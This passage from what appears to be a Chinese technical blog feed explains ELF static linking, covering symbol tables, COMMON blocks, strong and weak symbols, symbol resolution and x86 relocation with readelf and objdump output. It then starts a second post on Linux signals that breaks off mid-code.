表示该符号包含一个绝对的值</li><li>SHN_COMMON 表示该符号是一个COMMON块类型的符号</li><li>SHN_UNDEF 表示该符号未定义</li></ul></li></ul><p><strong>st_info</strong></p><p>符号的类型和绑定信息</p><p>绑定信息</p><ul><li>STB_LOCAL局部符号</li><li>STB_GLOBAL全局符号</li><li>STB_WEAK弱符号</li></ul><p>符号类型</p><ul><li>STT_NOTYPE 未知</li><li>STT_OBJECT 数据对象，比如变量</li><li>STT_FUNC 函数或可执行代码 </li><li>STT_SECTION 表示一个段</li><li>STT_FILE表示文件名 st_shndx一定是SHN_ABS</li></ul><p><strong>st_size</strong></p><p>符号大小，对于包含数据的符号，这个值是数据类型的大小，比如我们上面a.o的main就是main函数的大小，0x39&#x3D;57,int 类型的shared大小为4</p><p><strong>st_value</strong></p><ul><li>在可重定位目标文件里函数或变量符号<ul><li>符号类型不在common块里，则表示符号在段里的偏移</li><li>在common块里，则表示符号对齐属性</li></ul></li><li>可执行目标文件里<ul><li>表示符号的虚拟地址</li></ul></li></ul><p><strong>st_other</strong>暂时没用</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; readelf -s a.o b.o ab</span><br><span class="line"></span><br><span class="line">File: a.o</span><br><span class="line"></span><br><span class="line">Symbol table &#x27;.symtab&#x27; contains 11 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 00000000     0 FILE    LOCAL  DEFAULT  ABS a.c</span><br><span class="line">     2: 00000000     0 SECTION LOCAL  DEFAULT    1</span><br><span class="line">     3: 00000000     0 SECTION LOCAL  DEFAULT    3</span><br><span class="line">     4: 00000000     0 SECTION LOCAL  DEFAULT    4</span><br><span class="line">     5: 00000000     0 SECTION LOCAL  DEFAULT    6</span><br><span class="line">     6: 00000000     0 SECTION LOCAL  DEFAULT    7</span><br><span class="line">     7: 00000000     0 SECTION LOCAL  DEFAULT    5</span><br><span class="line">     8: 00000000    57 FUNC    GLOBAL DEFAULT    1 main</span><br><span class="line">     9: 00000000     0 NOTYPE  GLOBAL DEFAULT  UND shared</span><br><span class="line">    10: 00000000     0 NOTYPE  GLOBAL DEFAULT  UND swap</span><br><span class="line"></span><br><span class="line">File: b.o</span><br><span class="line"></span><br><span class="line">Symbol table &#x27;.symtab&#x27; contains 10 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 00000000     0 FILE    LOCAL  DEFAULT  ABS b.c</span><br><span class="line">     2: 00000000     0 SECTION LOCAL  DEFAULT    1</span><br><span class="line">     3: 00000000     0 SECTION LOCAL  DEFAULT    2</span><br><span class="line">     4: 00000000     0 SECTION LOCAL  DEFAULT    3</span><br><span class="line">     5: 00000000     0 SECTION LOCAL  DEFAULT    5</span><br><span class="line">     6: 00000000     0 SECTION LOCAL  DEFAULT    6</span><br><span class="line">     7: 00000000     0 SECTION LOCAL  DEFAULT    4</span><br><span class="line">     8: 00000000     4 OBJECT  GLOBAL DEFAULT    2 shared</span><br><span class="line">     9: 00000000    57 FUNC    GLOBAL DEFAULT    1 swap</span><br><span class="line"></span><br><span class="line">File: ab</span><br><span class="line"></span><br><span class="line">Symbol table &#x27;.symtab&#x27; contains 13 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 08048094     0 SECTION LOCAL  DEFAULT    1</span><br><span class="line">     2: 08048108     0 SECTION LOCAL  DEFAULT    2</span><br><span class="line">     3: 0804916c     0 SECTION LOCAL  DEFAULT    3</span><br><span class="line">     4: 00000000     0 SECTION LOCAL  DEFAULT    4</span><br><span class="line">     5: 00000000     0 FILE    LOCAL  DEFAULT  ABS a.c</span><br><span class="line">     6: 00000000     0 FILE    LOCAL  DEFAULT  ABS b.c</span><br><span class="line">     7: 080480cd    57 FUNC    GLOBAL DEFAULT    1 swap</span><br><span class="line">     8: 0804916c     4 OBJECT  GLOBAL DEFAULT    3 shared</span><br><span class="line">     9: 08049170     0 NOTYPE  GLOBAL DEFAULT    3 __bss_start</span><br><span class="line">    10: 08048094    57 FUNC    GLOBAL DEFAULT    1 main</span><br><span class="line">    11: 08049170     0 NOTYPE  GLOBAL DEFAULT    3 _edata</span><br><span class="line">    12: 08049170     0 NOTYPE  GLOBAL DEFAULT    3 _end</span><br></pre></td></tr></table></figure><p>为什么有些名字显示?</p><p>可以看的没显示的类型都为STT_SECTION他们的名字其实就是st_shndx代表的段的段名字</p><p>readelf没有显示，objdump给显示出来了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; objdump -t a.o</span><br><span class="line"></span><br><span class="line">a.o:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">SYMBOL TABLE:</span><br><span class="line"><span class="number">00000000</span> l    df *ABS*  <span class="number">00000000</span> a.c</span><br><span class="line"><span class="number">00000000</span> l    d  .text  <span class="number">00000000</span> .text</span><br><span class="line"><span class="number">00000000</span> l    d  .data  <span class="number">00000000</span> .data</span><br><span class="line"><span class="number">00000000</span> l    d  .bss   <span class="number">00000000</span> .bss</span><br><span class="line"><span class="number">00000000</span> l    d  .note.GNU-<span class="built_in">stack</span>        <span class="number">00000000</span> .note.GNU-<span class="built_in">stack</span></span><br><span class="line"><span class="number">00000000</span> l    d  .eh_frame      <span class="number">00000000</span> .eh_frame</span><br><span class="line"><span class="number">00000000</span> l    d  .comment       <span class="number">00000000</span> .comment</span><br><span class="line"><span class="number">00000000</span> g     F .text  <span class="number">00000039</span> main</span><br><span class="line"><span class="number">00000000</span>         *UND*  <span class="number">00000000</span> shared</span><br><span class="line"><span class="number">00000000</span>         *UND*  <span class="number">00000000</span> swap</span><br></pre></td></tr></table></figure><h5 id="什么是common块-amp-amp-强符号弱符号-amp-amp-弱引用强引用"><a href="#什么是common块-amp-amp-强符号弱符号-amp-amp-弱引用强引用" class="headerlink" title="什么是common块&amp;&amp;强符号弱符号&amp;&amp;弱引用强引用"></a>什么是common块&amp;&amp;强符号弱符号&amp;&amp;弱引用强引用</h5><p>我们用前面的simple section.c来说</p><p>.bss段存放未初始化的全局变量和局部静态变量(这里编译器其实为了节约磁盘空间把初始化为0的变量也放入了bss)，但是global_uninit_var却在COM块</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Num:    Value  Size Type    Bind   Vis      Ndx Name  </span><br><span class="line"><span class="number">14</span>: <span class="number">00000004</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT  COM global_uninit_var</span><br></pre></td></tr></table></figure><p>也就是说gcc把没有初始化的全局变量放到了COMMON块 当然gcc5也可以通过 -fno-common或者用__attribute__((nocommon))取消掉这个机制，这样多重定义的全局符号时，会触发一个错误</p><p>这个我在gcc11试了试发现好像默认没有放到common，而是都放到了bss</p><p>这种未初始化全局变量的符号叫做弱符号，相反的就叫做强符号</p><ul><li>不允许一个强符号被多次定义，否则链接器会报错</li><li>如果一个符号在某个目标文件中是强符号，链接时选强符号</li><li>一个符号在所有可重定位文件里都是弱符号，选字节最大的</li></ul><p>所以我们下面这样会自动选择强符号</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">test.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">p1</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">double</span> d = <span class="number">666666</span>;</span><br><span class="line"><span class="type">int</span> p= <span class="number">200</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    p1();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,&amp;d);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%f,%d&quot;</span>,d,p);</span><br><span class="line">&#125;</span><br><span class="line">p1.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> d;</span><br><span class="line"><span class="type">void</span> <span class="title function_">p1</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,&amp;d);</span><br><span class="line">    d =<span class="number">0xffffffff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们这样搞是不会报错的(实际上我在gcc11上报了multiple definition of d的错了，因为他默认不用common，可以通过-fcommon启用这个机制)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/NEMU&gt; gcc -m32  test.c p1.c</span><br><span class="line">grxer@Ubuntu16 /m/h/S/NEMU&gt; ./a.out</span><br><span class="line"><span class="number">0x804a020</span></span><br><span class="line"><span class="number">0x804a020</span></span><br><span class="line"><span class="number">666666.500000</span>,<span class="number">200</span>⏎</span><br></pre></td></tr></table></figure><p>当然我们的弱符号的字节大小是不能大于强符号的否则在ld链接过程有一个warning</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">test.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">p1</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> d = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> p= <span class="number">200</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    p1();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,&amp;d);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x,%x&quot;</span>,d,p);</span><br><span class="line">&#125;</span><br><span class="line">p1.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">double</span> d;</span><br><span class="line"><span class="type">void</span> <span class="title function_">p1</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,&amp;d);</span><br><span class="line">    d =<span class="number">1.0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/NEMU&gt; gcc -m32  test.c p1.c</span><br><span class="line">/usr/bin/ld: Warning: alignment <span class="number">4</span> of symbol `d<span class="number">&#x27;</span> in /tmp/ccEf1boS.o is smaller than <span class="number">8</span> in /tmp/cc2ZKeXO.o</span><br><span class="line">grxer@Ubuntu16 /m/h/S/NEMU&gt; ./a.out</span><br><span class="line"><span class="number">0x804a01c</span></span><br><span class="line"><span class="number">0x804a01c</span></span><br><span class="line"><span class="number">0</span>,<span class="number">3f</span>f00000</span><br></pre></td></tr></table></figure><p>gcc提供给我们__attribute__((weak))来来定义任何一个符号为弱符号。</p><p><em>_attribute</em>_((weak)) double d这样就消除了这条warning</p><p>但是这个输出显然是有问题的，d和p都变得奇怪起来</p><p>这个就是链接造成的，p1.c编译成一个可重定位模块时，他根本不会知道自己以后会干什么，在他眼里double d就是全部，所以他对d的赋值完全是按照double来的</p><p>但是到了链接的时候，对d的赋值是对test.c的int d强符号，用给double赋值的code对int 赋值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">08048460 &lt;p1&gt;:</span><br><span class="line">8048460:       55                      push   %ebp</span><br><span class="line">8048461:       89 e5                   mov    %esp,%ebp</span><br><span class="line">8048463:       83 ec 08                sub    $0x8,%esp</span><br><span class="line">8048466:       83 ec 08                sub    $0x8,%esp</span><br><span class="line">8048469:       68 1c a0 04 08          push   $0x804a01c</span><br><span class="line">804846e:       68 1a 85 04 08          push   $0x804851a</span><br><span class="line">8048473:       e8 68 fe ff ff          call   80482e0 &lt;printf@plt&gt;</span><br><span class="line">8048478:       83 c4 10                add    $0x10,%esp</span><br><span class="line">804847b:       d9 e8                   fld1</span><br><span class="line">804847d:       dd 1d 1c a0 04 08       fstpl  0x804a01c</span><br><span class="line">8048483:       90                      nop</span><br><span class="line">8048484:       c9                      leave</span><br><span class="line">8048485:       c3                      ret</span><br></pre></td></tr></table></figure><p>fld1把1这个浮点常数压倒x87栈的st0，fstpl再把他取出来放到&amp;d</p><p>double的1就是 3FF0000000000000</p><p><img src="/2023/04/28/static-link/image-20230429234155494.png" alt="image-20230429234155494"></p><p>这种bug如果在一个大型项目里找起来，那真的是栓q，所以extern很有必要</p><p>与之对应的还有强引用和弱引用 <em>_attribute</em>_ (weakref)来修饰</p><p>弱引用可以在找不到定义的时候链接成功，但是在执行时他的值为0</p><p>符号问题还有c++的符号修饰，c++的函数重载名称空间等依靠这个机制,c++filt可以帮我们解析这些修饰过的符号</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/NEMU&gt; c++filt _ZN3foo3barE</span><br><span class="line">foo::bar</span><br></pre></td></tr></table></figure><p>为了和c兼容可以用extern “c” int x; extern ”c” { intx ;inty} 来不修饰符号</p><p>一些c里函数为了在c++不被当初c++函数修饰导致无法使用,头文件里采用了#ifdef宏来处理</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> “c” &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">memset</span><span class="params">(<span class="type">void</span> *,<span class="type">int</span>,<span class="type">size_t</span>)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>说了这么多关于符号的东西，看看符号地址是怎么确定的，符号是怎么解析的</p><p><strong>符号地址</strong></p><p>符号在各个段里的偏移是确定的，我们linker把各个段拼接并分配虚拟地址，段基址我们自然知道，再加上原本的偏移就可以确定了</p><p><strong>符合解析</strong></p><p>链接器维护了三个集合E U D</p><ul><li>E 将被合并组成可执行文件的可重定位文件集合</li><li>U 当前引用但未解析的符合集合</li><li>D 当前所有定义符号的集合</li></ul><p>会从左到右扫描命令行出现的可重定位目标文件和静态库文件</p><p>当扫描到可重定位目标文件时 把它定义的符号加入D集合，引用单未定义的加入U</p><p>扫描到静态链接库时，依次检测库里的目标文件是不是包含U里面的未定义符号，包含则把这个符号从U里拿出来放入D，并把这个目标文件加入E，不包含直接丢弃该目标文件</p><p>扫描完全部时U是非空，链接器会报错终止，否则就开始合并E集合里的文件</p><p>这也就要求了我们静态链接时库的顺序问题，一定库放到最后，库之间如果有引用，还要调整一下顺序</p><h4 id="重定位"><a href="#重定位" class="headerlink" title="重定位"></a>重定位</h4><p>a.c中引用的 share和swap在编译器编译时是不确定的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter4&gt; objdump -dS a.o</span><br><span class="line"></span><br><span class="line">a.o:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;main&gt;:</span><br><span class="line">extern int shared;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">   0:   8d 4c 24 04             lea    0x4(%esp),%ecx</span><br><span class="line">   4:   83 e4 f0                and    $0xfffffff0,%esp</span><br><span class="line">   7:   ff 71 fc                pushl  -0x4(%ecx)</span><br><span class="line">   a:   55                      push   %ebp</span><br><span class="line">   b:   89 e5                   mov    %esp,%ebp</span><br><span class="line">   d:   51                      push   %ecx</span><br><span class="line">   e:   83 ec 14                sub    $0x14,%esp</span><br><span class="line">    int a = 6;</span><br><span class="line">  11:   c7 45 f4 06 00 00 00    movl   $0x6,-0xc(%ebp)</span><br><span class="line">    swap(&amp;a, &amp;shared);</span><br><span class="line">  18:   83 ec 08                sub    $0x8,%esp</span><br><span class="line">  1b:   68 00 00 00 00          push   $0x0</span><br><span class="line">  20:   8d 45 f4                lea    -0xc(%ebp),%eax</span><br><span class="line">  23:   50                      push   %eax</span><br><span class="line">  24:   e8 fc ff ff ff          call   25 &lt;main+0x25&gt;</span><br><span class="line">  29:   83 c4 10                add    $0x10,%esp</span><br><span class="line">  2c:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">&#125;</span><br><span class="line">  31:   8b 4d fc                mov    -0x4(%ebp),%ecx</span><br><span class="line">  34:   c9                      leave</span><br><span class="line">  35:   8d 61 fc                lea    -0x4(%ecx),%esp</span><br><span class="line">  38:   c3                      ret</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1b:   68 00 00 00 00          push   $0x0 ;对shared引用</span><br><span class="line">24:   e8 fc ff ff ff          call   25 &lt;main+0x25&gt;;对swap引用</span><br></pre></td></tr></table></figure><p>就在刚刚我们才解析了符号的地址，所以现在我们需要利用解析的符号地址把代码里引用的地址值给修正了，</p><p>我们怎么知道要去修正谁，那里修正，怎么修正，这一切都在.rel.xxx重定位表里</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset;<span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word    r_info;<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure><p><strong>r_offset</strong>表示要修正的位置第一个字节相对于这个段的偏移，作为linker我们知道段基址，自然可以找到要修正地址</p><p>r_info 低8位表示要重定位类型，高24位是符号在符号表里的下标</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter4&gt; readelf -r a.o</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.text&#x27;</span> at offset <span class="number">0x1b0</span> contains <span class="number">2</span> entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line"><span class="number">0000001</span>c  <span class="number">00000901</span> R_386_32          <span class="number">00000000</span>   shared</span><br><span class="line"><span class="number">00000025</span>  <span class="number">00000</span>a02 R_386_PC32        <span class="number">00000000</span>   swap</span><br></pre></td></tr></table></figure><p>Info高24位 9和a正好对应</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line"><span class="number">9</span>:  <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND shared</span><br><span class="line"><span class="number">10</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND swap</span><br></pre></td></tr></table></figure><p>offset 1c和25对应要修改的位置</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1b</span>:   <span class="number">68</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          push   $<span class="number">0x0</span> ;对shared引用</span><br><span class="line"><span class="number">24</span>:   e8 fc ff ff ff          call   <span class="number">25</span> &lt;main+<span class="number">0x25</span>&gt;;对swap引用</span><br></pre></td></tr></table></figure><p>重定位类型类型有好多种，不同平台也可能不一样 <a href="https://bbs.kanxue.com/thread-246373.htm">https://bbs.kanxue.com/thread-246373.htm</a></p><p>这里就看两种最基本最常用的</p><p>R_386_32 绝对寻址修正</p><p>R_386_PC32 相对寻址修正</p><p>这个时候我们已经知道了符号的实际地址S和保存在被修正位置的值A(偏移)</p><p>绝对寻址，之间把实际地址S+被修正位置的值A填入offset就可以</p><p>相对寻址 比上面多了减去被修正位置P得到偏移的过程 S+A-P</p><p>重定位后的main</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">08048094</span> &lt;main&gt;:</span><br><span class="line"> <span class="number">8048094</span>:       <span class="number">8</span>d <span class="number">4</span>c <span class="number">24</span> <span class="number">04</span>             lea    <span class="number">0x4</span>(%esp),%ecx</span><br><span class="line"> <span class="number">8048098</span>:       <span class="number">83</span> e4 f0                and    $<span class="number">0xfffffff0</span>,%esp</span><br><span class="line"> <span class="number">804809b</span>:       ff <span class="number">71</span> fc                pushl  <span class="number">-0x4</span>(%ecx)</span><br><span class="line"> <span class="number">804809</span>e:       <span class="number">55</span>                      push   %ebp</span><br><span class="line"> <span class="number">804809f</span>:       <span class="number">89</span> e5                   mov    %esp,%ebp</span><br><span class="line"> <span class="number">80480</span>a1:       <span class="number">51</span>                      push   %ecx</span><br><span class="line"> <span class="number">80480</span>a2:       <span class="number">83</span> ec <span class="number">14</span>                sub    $<span class="number">0x14</span>,%esp</span><br><span class="line"> <span class="number">80480</span>a5:       c7 <span class="number">45</span> f4 <span class="number">06</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   $<span class="number">0x6</span>,<span class="number">-0xc</span>(%ebp)</span><br><span class="line"> <span class="number">80480</span>ac:       <span class="number">83</span> ec <span class="number">08</span>                sub    $<span class="number">0x8</span>,%esp</span><br><span class="line"> <span class="number">80480</span>af:       <span class="number">68</span> <span class="number">6</span>c <span class="number">91</span> <span class="number">04</span> <span class="number">08</span>          push   $<span class="number">0x804916c</span></span><br><span class="line"> <span class="number">80480b</span>4:       <span class="number">8</span>d <span class="number">45</span> f4                lea    <span class="number">-0xc</span>(%ebp),%eax</span><br><span class="line"> <span class="number">80480b</span>7:       <span class="number">50</span>                      push   %eax</span><br><span class="line"> <span class="number">80480b</span>8:       e8 <span class="number">10</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          call   <span class="number">80480</span>cd &lt;swap&gt;</span><br><span class="line"> <span class="number">80480b</span>d:       <span class="number">83</span> c4 <span class="number">10</span>                add    $<span class="number">0x10</span>,%esp</span><br><span class="line"> <span class="number">80480</span>c0:       b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0x0</span>,%eax</span><br><span class="line"> <span class="number">80480</span>c5:       <span class="number">8b</span> <span class="number">4</span>d fc                mov    <span class="number">-0x4</span>(%ebp),%ecx</span><br><span class="line"> <span class="number">80480</span>c8:       c9                      leave</span><br><span class="line"> <span class="number">80480</span>c9:       <span class="number">8</span>d <span class="number">61</span> fc                lea    <span class="number">-0x4</span>(%ecx),%esp</span><br><span class="line"> <span class="number">80480</span>cc:       c3                      ret</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">     解析后的符号表</span><br><span class="line">     7: 080480cd    57 FUNC    GLOBAL DEFAULT    1 swap</span><br><span class="line">     8: 0804916c     4 OBJECT  GLOBAL DEFAULT    3 shared</span><br><span class="line">     </span><br><span class="line">80480af:       68 6c 91 04 08          push   $0x804916c;对shared引用</span><br><span class="line">80480b8:       e8 10 00 00 00          call   80480cd &lt;swap&gt;;对swap引用</span><br></pre></td></tr></table></figure><p>6c 91 04 08 即0x804916c shared的地址</p><p>10 00 00 00 即0x00000010 0x80480b8+0x5+0x10&#x3D;0x804 80CD</p>]]></content>
      
      
      
        <tags>
            
            <tag> ELF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Signal</title>
      <link href="/2023/04/24/linux-signal/"/>
      <url>/2023/04/24/linux-signal/</url>
      
        <content type="html"><![CDATA[<h2 id="Linux对异常的处理"><a href="#Linux对异常的处理" class="headerlink" title="Linux对异常的处理"></a>Linux对异常的处理</h2><p>陷入内核调用异常处理程序，对于故障(Fault)</p><ul><li><p>如果处理程序可以修复的故障，比如正常的缺页，修复后回到断点处继续执行</p></li><li><p>如果不能修复的，比如越级，越权，越界，除0等，linux只会给进程发送一个信号，回到用户态，进程去调度相应的信号处理程序，这样做是快速在内核态完成异常处理，减小嵌套执行异常的可能性</p></li></ul><p>linux里可以用kill -l查看信号列表，编号为1 ~ 31的信号为传统UNIX支持的信号，是不可靠信号(非实时的)，编号为32 ~ 63的信号是后来扩充的，称做可靠信号(实时信号)。不可靠信号和可靠信号的区别在于前者不支持排队，可能会造成信号丢失，而后者不会。</p><table><thead><tr><th>信号值</th><th>信号名称</th><th>说明</th><th>默认行为</th></tr></thead><tbody><tr><td>1</td><td><code>SIGHUP</code></td><td>终端断开连接</td><td>终止进程</td></tr><tr><td>2</td><td><code>SIGINT</code></td><td>终端中断符（Ctrl+C）</td><td>终止进程</td></tr><tr><td>3</td><td><code>SIGQUIT</code></td><td>终端退出符（Ctrl+\）</td><td>生成core文件并终止进程</td></tr><tr><td>4</td><td><code>SIGILL</code></td><td>非法指令</td><td>生成core文件并终止进程</td></tr><tr><td>5</td><td><code>SIGTRAP</code></td><td>跟踪断点</td><td>生成core文件并终止进程</td></tr><tr><td>6</td><td><code>SIGABRT</code></td><td>异常终止</td><td>生成core文件并终止进程</td></tr><tr><td>7</td><td><code>SIGBUS</code></td><td>总线错误</td><td>生成core文件并终止进程</td></tr><tr><td>8</td><td><code>SIGFPE</code></td><td>浮点异常</td><td>生成core文件并终止进程</td></tr><tr><td>9</td><td><code>SIGKILL</code></td><td>无条件终止</td><td>终止进程</td></tr><tr><td>10</td><td><code>SIGUSR1</code></td><td>用户定义信号1</td><td>终止进程</td></tr><tr><td>11</td><td><code>SIGSEGV</code></td><td>段错误</td><td>生成core文件并终止进程</td></tr><tr><td>12</td><td><code>SIGUSR2</code></td><td>用户定义信号2</td><td>终止进程</td></tr><tr><td>13</td><td><code>SIGPIPE</code></td><td>写入管道或套接字时，读取端已关闭</td><td>终止进程</td></tr><tr><td>14</td><td><code>SIGALRM</code></td><td>定时器信号</td><td>终止进程</td></tr><tr><td>15</td><td><code>SIGTERM</code></td><td>终止请求</td><td>终止进程</td></tr><tr><td>16</td><td><code>SIGSTKFLT</code></td><td>协处理器堆栈错误</td><td>生成core文件并终止进程</td></tr><tr><td>17</td><td><code>SIGCHLD</code></td><td>子进程状态变化</td><td>忽略信号</td></tr><tr><td>18</td><td><code>SIGCONT</code></td><td>继续执行停止的进程</td><td>忽略信号</td></tr><tr><td>19</td><td><code>SIGSTOP</code></td><td>停止进程，不能被捕捉或忽略</td><td>停止进程</td></tr><tr><td>20</td><td><code>SIGTSTP</code></td><td>终端停止符（Ctrl+Z）</td><td>停止进程</td></tr><tr><td>21</td><td><code>SIGTTIN</code></td><td>后台进程试图从终端读取</td><td>停止进程</td></tr><tr><td>22</td><td><code>SIGTTOU</code></td><td>后台进程试图向终端写入</td><td>停止进程</td></tr><tr><td>23</td><td><code>SIGURG</code></td><td>套接字上接收到紧急数据</td><td>忽略信号</td></tr><tr><td>24</td><td><code>SIGXCPU</code></td><td>CPU时间限制超时</td><td>生成core文件并终止进程</td></tr><tr><td>25</td><td><code>SIGXFSZ</code></td><td>文件大小限制超时</td><td>生成core文件并终止进程</td></tr><tr><td>26</td><td><code>SIGVTALRM</code></td><td>虚拟定时器信号</td><td>终止进程</td></tr><tr><td>27</td><td><code>SIGPROF</code></td><td>分时定时器信号</td><td>终止进程</td></tr><tr><td>28</td><td><code>SIGWINCH</code></td><td>窗口大小变化</td><td>忽略信号</td></tr><tr><td>29</td><td><code>SIGIO</code></td><td>异步I&#x2F;O事件</td><td>忽略信号</td></tr><tr><td>30</td><td>SIGPWR</td><td>电源故障</td><td>终止</td></tr><tr><td>31</td><td>SIGSYS</td><td>非法系统调用</td><td>终止</td></tr></tbody></table><p>这种信号机制，给了用户一种进程间通信机制，自定义信号处理程序的权力</p><p>linux 1 ~ 31里一种类型的信号最多只有一个待处理信号(一个发出而没有被接收处理的信号叫做待处理信号)，因为传统UNIX支持的信号是用bitflag实现的，已经置1再置1也没意思，这也是为什么叫不可靠信号的原因，后面序号的可靠信号都是通过队列来实现</p><h2 id="发送信号"><a href="#发送信号" class="headerlink" title="发送信号"></a>发送信号</h2><ol><li><p>内核的异常处理程序</p></li><li><p>&#x2F;bin&#x2F;kill发送</p></li></ol><blockquote><p>&#x2F;bin&#x2F;kill -signalid pid</p><p>pid为正数给pid进程 发送signalid信号</p><p>pid为负数给pid<strong>进程组</strong>所有进程发送signalid信号</p></blockquote><ol start="3"><li>键盘发送信号 ctrl c ctrl z等</li><li>kill函数显式地要求内核发送一个信号给目的进程。</li></ol><blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">kill</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">int</span> sig)</span>;</span><br><span class="line">成功返回<span class="number">0</span> 否则返回<span class="number">-1</span>;</span><br><span class="line">pid &gt;<span class="number">0</span> 发送sig给进程pid;</span><br><span class="line">pid =<span class="number">0</span> 发送sig给调用进程所在进程组的每一个进程(包括自己);</span><br><span class="line">pid &lt;<span class="number">0</span> 发送sig给|pid|进程组的每一个进程</span><br></pre></td></tr></table></figure></blockquote><ol start="5"><li>alarm函数</li></ol><blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">alarm</span><span class="params">(<span 